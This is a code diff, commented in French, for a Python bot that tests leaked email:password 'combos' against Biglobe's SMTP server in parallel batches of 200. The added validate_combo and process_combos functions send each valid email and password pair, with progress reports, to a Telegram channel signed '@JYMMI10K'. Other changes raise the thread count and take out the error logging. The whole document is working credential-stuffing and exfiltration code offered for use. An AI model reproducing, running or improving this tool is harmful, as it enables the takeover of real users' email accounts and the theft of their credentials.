@@ -28,14 +28,14 @@ class BotManager:
         load_dotenv()
 
         # Configuration par défaut
-        self.THREADS = 20  # Augmentation du nombre de threads
+        self.THREADS = 200  # Nombre de threads pour traiter 200 combos en parallèle
         self.SMTP_SERVER = "mail.biglobe.ne.jp"
         self.SMTP_PORT = 587
         self.DELAY_BETWEEN_CHECKS = 30  # secondes entre chaque tentative
         self.STATS_INTERVAL = 60
-        self.MAX_RETRIES = 3  # Nombre maximum de tentatives
-        self.BATCH_SIZE = 50  # Taille des lots de traitement
-        self.CONNECTION_TIMEOUT = 15  # Timeout de connexion
+        self.MAX_RETRIES = 1  # Une seule tentative par combo
+        self.BATCH_SIZE = 200  # Taille des lots de traitement
+        self.CONNECTION_TIMEOUT = 30  # Timeout de connexion de 30 secondes
         self.PERFORMANCE_MODE = True  # Mode performance activé
         
         # Configuration Telegram
@@ -499,13 +499,9 @@ Commandes disponibles :
             return False
 
         except (smtplib.SMTPServerDisconnected, smtplib.SMTPException) as e:
-            with self.print_lock:
-                print(f"[!] Erreur SMTP ({email}): {e}")
             return False
 
         except Exception as e:
-            with self.print_lock:
-                print(f"[!] Erreur inconnue ({email}): {e}")
             return False
 
     async def send_telegram_message(self, message: str) -> None:
@@ -670,21 +666,55 @@ Commandes disponibles :
             return False
         return True
 
-    async def process_batch(self, combos: List[str], receiver: str) -> List[str]:
-        """Traite un lot de combos de manière optimisée"""
+    async def process_combos(self, combos: List[str], receiver: str) -> List[str]:
+        """Traite les combos par lots de 200 avec un timeout de 30 secondes"""
         valid_results = []
-        tasks = []
+        total = len(combos)
         
-        for combo in combos:
-            task = asyncio.create_task(self.process_combo(combo, receiver))
-            tasks.append(task)
+        # Diviser les combos en lots de 200
+        for i in range(0, total, self.BATCH_SIZE):
+            batch = combos[i:i + self.BATCH_SIZE]
+            batch_size = len(batch)
             
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-        
-        for result in results:
-            if isinstance(result, str):
-                valid_results.append(result)
-                
+            # Message de début pour chaque lot
+            start_message = f"""
+🔍 Début du traitement du lot {i//self.BATCH_SIZE + 1}
+━━━━━━━━━━━━━━━━━━━━
+📊 Taille du lot: {batch_size} combos
+⏳ Timeout: 30 secondes par combo
+━━━━━━━━━━━━━━━━━━━━
+💻 By @JYMMI10K
+"""
+            await self.send_telegram_message(start_message)
+            
+            # Traiter le lot en parallèle
+            tasks = []
+            for combo in batch:
+                tasks.append(self.process_combo(combo, receiver))
+            
+            # Exécuter toutes les tâches en parallèle
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+            
+            # Filtrer les résultats valides
+            for result in results:
+                if isinstance(result, str):
+                    valid_results.append(result)
+            
+            # Message de résultat pour le lot
+            result_message = f"""
+📊 Résultat du lot {i//self.BATCH_SIZE + 1}
+━━━━━━━━━━━━━━━━━━━━
+✅ Valides dans ce lot: {len([r for r in results if isinstance(r, str)])}
+❌ Invalides dans ce lot: {len([r for r in results if r is None])}
+📈 Progression totale: {i + batch_size}/{total} ({int(((i + batch_size)/total)*100)}%)
+━━━━━━━━━━━━━━━━━━━━
+💻 By @JYMMI10K
+"""
+            await self.send_telegram_message(result_message)
+            
+            # Attendre 30 secondes avant le prochain lot
+            await asyncio.sleep(30)
+            
         return valid_results
 
     async def optimize_performance(self):
@@ -704,6 +734,32 @@ Commandes disponibles :
             self.DELAY_BETWEEN_CHECKS = min(60, self.DELAY_BETWEEN_CHECKS + 5)
         else:
             self.DELAY_BETWEEN_CHECKS = max(30, self.DELAY_BETWEEN_CHECKS - 5)
+
+    async def validate_combo(self, email: str, password: str) -> None:
+        """Valide un combo Biglobe"""
+        try:
+            if await self.send_test_mail(email, password, "test@example.com"):
+                with self.print_lock:
+                    self.valid_results.append(f"{email}:{password}")
+                    if len(self.valid_results) % 10 == 0:  # Message tous les 10 valides
+                        valid_message = f"""
+✅ NOUVEAU COMBO VALIDE ✅
+━━━━━━━━━━━━━━━━━━━━
+📧 Email: {email}
+🔑 Password: {password}
+📊 Total valides: {len(self.valid_results)}
+━━━━━━━━━━━━━━━━━━━━
+💻 By @JYMMI10K
+"""
+                        await self.send_telegram_message(valid_message)
+            else:
+                with self.print_lock:
+                    self.invalid_count += 1
+        except Exception as e:
+            with self.print_lock:
+                self.timeout_count += 1
+        finally:
+            self.remaining -= 1
 
 async def main():
     """Point d'entrée principal"""
